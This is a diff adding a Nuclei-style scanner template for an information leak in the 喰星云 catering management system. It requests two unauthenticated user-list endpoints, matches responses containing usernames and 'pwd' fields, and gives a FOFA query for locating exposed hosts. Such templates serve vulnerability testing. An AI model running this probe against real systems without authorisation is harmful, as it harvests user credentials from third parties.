@@ -1,0 +1,34 @@
+id: cxy-infoleak-all
+
+info:
+  name: 喰星云-数字化餐饮服务系统-信息泄漏-all
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="tmp_md5_pwd"
+
+  tags: Information Disclosure
+
+http:
+  - raw:
+      - |
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+    attack: batteringram
+    payloads:
+      path:
+        - /chainsales/head/user/listuser
+        - /chainsales/head/user/listsoleuser
+      
+    # stop-at-first-match: true
+    max-size: 1000
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code==200 && contains_all(body,"username","pwd")
